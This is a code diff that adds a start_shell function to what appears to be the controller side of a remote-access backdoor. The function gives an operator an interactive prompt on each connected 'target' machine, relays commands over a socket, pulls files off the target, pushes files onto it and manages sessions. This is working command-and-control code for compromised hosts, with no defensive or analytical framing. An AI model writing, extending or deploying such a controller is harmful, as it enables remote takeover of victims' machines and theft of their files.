@@ -30,3 +30,38 @@ close: Turn off the server and close all connections
 help: Show this message
 
 '''
+
+def start_shell(target_socket,target_ip):
+    while True:
+        try:
+            cmd = input(f"{target_ip}~$ ")
+            reliable_send(target_socket, cmd)
+            if cmd == "q":
+                break
+            elif cmd == "close":
+                target_socket.close()
+                targets.remove(target_socket)
+                ips.remove(target_ip)
+                break
+            elif cmd[:8] == "download":
+                file_data = receive_frame(target_socket)
+                if file_data == "DOWNLOAD_FAIL":
+                    print("Download Failed")
+                else:
+                    with open(cmd[9:],"wb") as f:
+                        f.write(base64.b64decode(file_data))
+            elif cmd[:6] == "upload":
+                try:
+                    with open(cmd[7:],"rb") as f:
+                        file_to_upload = f.read()
+                        encoded_file = base64.b64encode(file_to_upload)
+                        reliable_send(target_socket, encoded_file.decode("utf-8"))
+                except Exception as e:
+                    print(e)
+                    failed = "UPLOAD_FAIL"
+                    reliable_send(target_socket, failed)
+        except Exception as e:
+            print(str(e))
+        message = receive_frame(target_socket)
+        if message:
+            print(message, flush=True)
